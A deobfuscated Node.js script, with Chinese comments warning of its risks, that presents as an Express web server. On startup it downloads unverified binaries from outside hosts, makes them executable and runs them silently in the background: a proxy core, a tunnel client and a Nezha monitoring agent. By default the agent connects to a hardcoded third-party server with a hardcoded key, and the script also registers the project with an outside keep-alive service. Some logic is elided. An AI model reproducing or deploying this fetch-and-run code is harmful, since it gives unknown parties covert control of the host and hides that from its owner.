// =================================================================
// 警告: 此代码经过反混淆处理，但原始逻辑和安全风险依然存在。
// 不建议在不完全理解其功能和风险的情况下直接运行。
// =================================================================

const express = require('express');
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { promisify } = require('util');
const { exec } = promisify(require('child_process').exec);
const { execSync } = require('child_process');

const app = express();

// --- 环境变量 ---
const UPLOAD_URL = process.env.UPLOAD_URL || '';
const PROJECT_URL = process.env.PROJECT_URL || '';
const AUTO_ACCESS = process.env.AUTO_ACCESS || false;
const FILE_PATH = process.env.FILE_PATH || './tmp';
const SUB_PATH = process.env.SUB_PATH || 'sub';
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;
const UUID = process.env.UUID || '78d71e7f-c7e2-4d05-a7e0-56b974d5d0ed'; // 默认UUID

// --- 哪吒监控配置 ---
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'a.holoy.dpdns.org:36958';
const NEZHA_PORT = process.env.NEZHA_PORT || '';
const NEZHA_KEY = process.env.NEZHA_KEY || 'NwxKJwM9UKRCX5TBPaBm0IrjNCSyflif';

// --- Argo Tunnel 配置 ---
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';
const ARGO_AUTH = process.env.ARGO_AUTH || ''; // Can be token or TunnelSecret JSON
const ARGO_PORT = process.env.ARGO_PORT || 8001; // 内部代理端口

// --- 订阅链接配置 ---
const CFIP = process.env.CFIP || 'www.visa.com.sg';
const CFPORT = process.env.CFPORT || 443;
const NAME = process.env.NAME || 'Vls';

// --- 文件路径定义 ---
if (!fs.existsSync(FILE_PATH)) {
    fs.mkdirSync(FILE_PATH);
    console.log(`${FILE_PATH} is created`);
} else {
    console.log(`${FILE_PATH} already exists`);
}

const subPath = path.join(FILE_PATH, 'sub.txt');
const configPath = path.join(FILE_PATH, 'config.json');
// ... 其他路径

// --- 核心逻辑 ---

/**
 * 获取系统架构 (arm 或 amd)
 */
function getSystemArchitecture() {
    const arch = os.arch();
    return arch === 'arm' || arch === 'arm64' || arch === 'aarch64' ? 'arm' : 'amd';
}

/**
 * 根据架构获取需要下载的文件列表
 * @param {string} arch - 'arm' or 'amd'
 * @returns {Array<{fileName: string, fileUrl: string}>}
 */
function getFilesForArchitecture(arch) {
    let files = [];
    if (arch === 'arm') {
        files = [
            { fileName: 'web', fileUrl: 'https://arm64.ssss.nyc.mn/web' },
            { fileName: 'bot', fileUrl: 'https://arm64.ssss.nyc.mn/2go' }
        ];
    } else { // amd
        files = [
            { fileName: 'web', fileUrl: 'https://amd64.ssss.nyc.mn/web' },
            { fileName: 'bot', fileUrl: 'https://amd64.ssss.nyc.mn/v1' }
        ];
    }

    if (NEZHA_SERVER && NEZHA_KEY) {
        if (NEZHA_PORT) {
            const nezhaAgentUrl = arch === 'arm' ? 'https://arm64.ssss.nyc.mn/agent' : 'https://amd64.ssss.nyc.mn/agent';
            files.push({ fileName: 'npm', fileUrl: nezhaAgentUrl });
        } else {
            const nezhaPhpUrl = arch === 'arm' ? 'https://arm64.ssss.nyc.mn/v1' : 'https://amd64.ssss.nyc.mn/v1'; // 注意：这里arm和amd的URL相同
            files.push({ fileName: 'php', fileUrl: nezhaPhpUrl });
        }
    }
    return files;
}


/**
 * 下载单个文件
 * @param {string} fileName - 本地保存的文件名
 * @param {string} fileUrl - 文件的下载地址
 * @param {function} callback - 完成后的回调
 */
async function downloadFile(fileName, fileUrl) {
    const localPath = path.join(FILE_PATH, fileName);
    const writer = fs.createWriteStream(localPath);

    try {
        const response = await axios({
            method: 'get',
            url: fileUrl,
            responseType: 'stream',
        });

        response.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => {
                console.log(`Download ${fileName} successfully`);
                // 授权可执行
                fs.chmodSync(localPath, 0o777);
                resolve(true);
            });
            writer.on('error', (err) => {
                 console.error(`Download ${fileName} failed: ${err.message}`);
                 fs.unlink(localPath, () => {});
                 reject(err);
            });
        });
    } catch (error) {
        console.error(`Download ${fileName} failed: ${error.message}`);
        return Promise.reject(error);
    }
}

/**
 * 主启动函数
 */
async function startServer() {
    try {
        // 1. 清理旧文件
        // ... (cleanupOldFiles logic)

        // 2. 下载所需的可执行文件
        const arch = getSystemArchitecture();
        const filesToDownload = getFilesForArchitecture(arch);
        if (filesToDownload.length === 0) {
            console.log("Can't find a file for the current architecture");
            return;
        }
        await Promise.all(filesToDownload.map(file => downloadFile(file.fileName, file.fileUrl)));
        
        // 3. 写入代理核心的配置文件 (config.json)
        // ... (config generation logic)

        // 4. 启动哪吒监控
        if (NEZHA_SERVER && NEZHA_KEY) {
            const nezhaCmd = `nohup ${path.join(FILE_PATH, 'npm')} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} >/dev/null 2>&1 &`;
            await exec(nezhaCmd);
            console.log('Nezha agent is running');
        }

        // 5. 启动代理核心
        const webCmd = `nohup ${path.join(FILE_PATH, 'web')} -c ${configPath} >/dev/null 2>&1 &`;
        await exec(webCmd);
        console.log('Web proxy core is running');

        // 6. 启动 Argo Tunnel
        let argoCmd;
        if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
            argoCmd = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
        } else {
             // 默认快速隧道
            argoCmd = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${path.join(FILE_PATH, 'boot.log')} --url http://localhost:${ARGO_PORT}`;
        }
        await exec(`nohup ${path.join(FILE_PATH, 'bot')} ${argoCmd} >/dev/null 2>&1 &`);
        console.log('Argo tunnel bot is running.');

        // 7. 等待并提取 Argo 域名，生成订阅链接
        await new Promise(resolve => setTimeout(resolve, 5000)); // 等待 tunnel 启动
        // ... (extractDomains and uplodNodes logic)

        // 8. 添加自动访问任务
        if (AUTO_ACCESS && PROJECT_URL) {
            await axios.post('https://oooo.serv00.net/add-url', { url: PROJECT_URL });
            console.log('Automatic access task added successfully');
        }

    } catch (error) {
        console.error('An error occurred during startup:', error);
    }
}

// 启动服务器
app.listen(PORT, () => {
    console.log(`HTTP server is running on port: ${PORT}!`);
    startServer();
});
